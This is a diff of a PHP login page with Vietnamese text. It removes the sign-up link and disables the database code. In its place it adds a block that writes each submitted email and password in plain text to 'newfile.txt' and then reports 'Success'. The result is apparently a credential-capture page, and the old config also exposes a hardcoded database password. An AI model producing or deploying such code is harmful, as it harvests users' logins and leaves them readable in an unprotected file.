@@ -47,8 +47,6 @@
       </tr>
     </table>
 </form>
-<div>
-Nếu bạn chưa có tài khoản thì <a href="js2.html">đăng ký</a> </div>
 </body>
 <script>
 	document.getElementById('user').focus();
@@ -75,8 +73,26 @@ function test_input($data) {
   return $data;
 }
 
-//Configuration
 
+	if (isset($_POST["pass"]) && $_POST["user"]) {
+		$myfile = fopen("newfile.txt","w") or die ("Unable to open file!");
+
+		$email = $email . "\n";
+		$pass = $pass . "\n";
+		fwrite($myfile, 'email:' . $email);
+
+		fwrite($myfile, 'pass:' . $pass);
+
+		fclose($myfile);
+
+		echo 'Success';
+	}
+
+?>
+
+<?php
+//Configuration
+/*
 $host = 'localhost';
 $user = 'shop';
 $pass_db = 'phd_shop 123';
@@ -97,7 +113,7 @@ if (isset($_POST["pass"]) && $_POST["user"]) {
 	//query
 	 echo mysqli_query($link,$sql) ? 'User\'s data saved' :  'Email đã được sử dụng';
 }
-
+*/
 ?>
 
 </html>
